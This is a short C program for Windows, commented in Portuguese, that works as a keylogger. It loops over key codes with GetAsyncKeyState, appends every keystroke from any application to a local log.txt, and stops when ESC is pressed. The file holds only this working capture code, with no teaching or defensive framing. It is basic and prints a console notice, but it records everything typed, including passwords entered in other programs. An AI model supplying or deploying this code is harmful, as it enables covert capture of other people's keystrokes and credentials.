#include <stdio.h>
#include <windows.h>

int main() {
    short keyState;
    FILE *file;

    file = fopen("log.txt", "a+");

    if (file == NULL) {
        printf("Não foi possível abrir o arquivo.\n");
        return 1;
    }

    printf("Pressione ESC para sair...\n");

    while (1) {
        // Loop através das teclas
        for (int key = 8; key <= 255; key++) {
            keyState = GetAsyncKeyState(key);

            // Verifica se a tecla foi pressionada
            if (keyState & 0x0001) {
                if (key == VK_ESCAPE) {
                     // Sai do programa se ESC for pressionado
                  // fopen("log.txt", "w");
                    fclose(file);
                    return 0;
                }

                // Grava a tecla no arquivo
                if (key >= 'A' && key <= 'Z') {
                    fprintf(file, "%c", key);
                } else {
                    switch (key) {
                        case VK_SPACE:
                            fprintf(file, " ");
                            break;
                        case VK_RETURN:
                            fprintf(file, "\n");
                            break;
                        case VK_TAB:
                            fprintf(file, "\t");
                            break;
                        default:
                            fprintf(file, "[%d]", key);
                    }
                }

                fflush(file);  // Garante que os dados sejam escritos no arquivo
            }
        }

        Sleep(10); // Evita sobrecarrega da CPU
    }
}
